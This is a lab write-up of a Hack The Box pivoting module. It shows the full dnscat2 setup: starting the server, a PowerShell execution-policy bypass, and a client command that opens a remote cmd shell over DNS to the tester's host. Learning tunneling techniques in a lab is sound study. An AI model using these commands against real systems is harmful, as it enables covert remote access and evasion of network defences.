# DNS Tunneling with dnscat2 - HTB Pivoting Module Writeup

**Date Completed:** 2025-07-22

## 🧠 Summary

This module demonstrated the use of **dnscat2** to tunnel shell access through DNS TXT records using an encrypted channel. It simulated real-world DNS-based C2 communications used in stealthy post-exploitation scenarios.

---

## 🧰 Tools Used

- `dnscat2` (Ruby server)
- `dnscat2.ps1` (PowerShell client)
- PowerShell (on target Windows host)
- Git
- `scp` for file transfer (though port 22 was closed)
- RDP via `xfreerdp` (to interact with target)

---

## ⚙️ Steps Taken

### 🧪 1. Clone & Run dnscat2 Server

```bash
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server
sudo gem install bundler
sudo bundle install
sudo ruby dnscat2.rb --dns host=10.10.15.169,port=53,domain=inlanefreight.local --no-cache
```

> 🔐 Server gave us a pre-shared secret for encryption.

---

### 💾 2. Clone dnscat2 PowerShell Client

```bash
git clone https://github.com/lukebaggett/dnscat2-powershell.git
```

Transferred `dnscat2.ps1` to Windows host using a browser or tool like `wget` (since SSH/SCP failed).

---

### 🔐 3. Bypass PowerShell Execution Policy

On the Windows host:

```powershell
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
Import-Module .\dnscat2.ps1
```

---

### 🎯 4. Start Client and Establish Tunnel

```powershell
Start-Dnscat2 -DNSserver 10.10.15.169 -Domain inlanefreight.local -PreSharedSecret <SECRET> -Exec cmd
```

On the Kali dnscat2 server:

```text
window -i 1
```

Confirmed:
```
Session 1 Security: ENCRYPTED AND VERIFIED!
Microsoft Windows [Version 10.0.18363.1801]
```

---

### 📂 5. Navigate Target and Capture the Flag

```cmd
cd \\Users\\htb-student\\Documents
type flag.txt
```

---

## ✅ Result

- **Tunnel successfully established**
- **Flag captured via DNS C2 shell**
- Demonstrated the stealth and power of DNS tunneling

---

## 🔁 Notes

- `scp` failed due to port 22 being blocked — used RDP + browser for transfer.
- Execution policy bypass was critical.
- Patience required due to latency on DNS-based shells.

---

Crafted with ❤️ by Don Trabajo
